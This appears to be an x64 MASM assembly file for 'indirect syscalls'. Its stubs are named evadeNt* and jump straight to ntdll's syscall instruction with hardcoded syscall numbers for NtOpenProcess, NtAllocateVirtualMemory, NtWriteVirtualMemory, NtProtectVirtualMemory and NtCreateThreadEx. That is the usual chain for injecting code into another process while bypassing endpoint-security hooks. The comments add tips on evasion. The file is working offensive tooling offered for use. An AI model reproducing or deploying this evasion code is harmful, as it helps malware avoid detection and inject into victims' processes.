; Indirect Syscalls FTW
; note - this might not be indirect syscalls - since we are still using the actual syscalls, just jumping to the syscall instruction instead of doing it ourselves.
; i would recommend fetching the actual syscall as well from im guessing 0x8 offset? i don't know, debug ntdll and look at it yourself.
; then using that, it's also the best since syscall numbers tend to change with new NTDLL versions, and new SSDT versions. (kernel)
.data

EXTERN NtOpenProcessSyscall:QWORD
EXTERN NtFreeVirtualMemorySyscall:QWORD
EXTERN NtCreateThreadExSyscall:QWORD
EXTERN NtCloseSyscall:QWORD
EXTERN NtProtectVirtualMemorySyscall:QWORD
EXTERN NtAllocateVirtualMemorySyscall:QWORD
EXTERN NtWriteVirtualMemorySyscall:QWORD

.code
evadeNtOpenProcess PROC
	mov r10, rcx
	mov eax, 26h
	jmp qword ptr [NtOpenProcessSyscall]
evadeNtOpenProcess ENDP

evadeNtFreeVirtualMemory PROC
	mov r10, rcx
	mov eax, 1eh
	jmp qword ptr [NtFreeVirtualMemorySyscall]
evadeNtFreeVirtualMemory ENDP

evadeNtCreateThreadEx PROC
	mov r10, rcx
	mov eax, 0C2h
	jmp qword ptr [NtCreateThreadExSyscall]
evadeNtCreateThreadEx ENDP

evadeNtClose PROC
	mov r10, rcx
	mov eax, 0Fh
	jmp qword ptr [NtCloseSyscall]
evadeNtClose ENDP

evadeNtProtectVirtualMemory PROC
	mov r10, rcx
	mov eax, 50h
	jmp qword ptr [NtProtectVirtualMemorySyscall]
evadeNtProtectVirtualMemory ENDP

evadeNtAllocateVirtualMemory PROC
	mov r10, rcx
	mov eax, 18h
	jmp qword ptr [NtAllocateVirtualMemorySyscall]
evadeNtAllocateVirtualMemory ENDP

evadeNtWriteVirtualMemory PROC
	mov r10, rcx
	mov eax, 3ah
	jmp qword ptr [NtWriteVirtualMemorySyscall]
evadeNtWriteVirtualMemory ENDP

end

